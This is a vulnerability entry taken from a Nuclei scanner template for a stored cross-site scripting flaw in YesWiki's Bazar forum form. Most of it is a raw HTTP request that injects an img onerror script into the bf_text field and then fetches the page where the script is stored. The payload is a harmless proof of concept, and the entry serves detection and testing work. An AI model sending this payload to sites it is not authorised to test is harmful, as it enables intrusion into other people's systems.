# Vulnerability: YesWiki - Stored Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`yeswiki-stored-xss.yaml`)

## Description
YesWiki contains a stored contains a cross-site scripting vulnerability via the bf_text field when adding a new entry for Forum.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /?BazaR&vue=saisir&action=saisir_fiche&id=2 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT8dS2PT0WtxACLyu

------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="bf_titre"

blog
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="bf_text"

"><img src=x onerror=console.log(123);>
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="bf_description"

abcd
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="fichierbf_file"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="antispam"

1
------WebKitFormBoundaryT8dS2PT0WtxACLyu
Content-Disposition: form-data; name="id_typeannonce"

2
------WebKitFormBoundaryT8dS2PT0WtxACLyu--

GET /?BazaR&vue=consulter HTTP/1.1
Host: {{Hostname}}
```

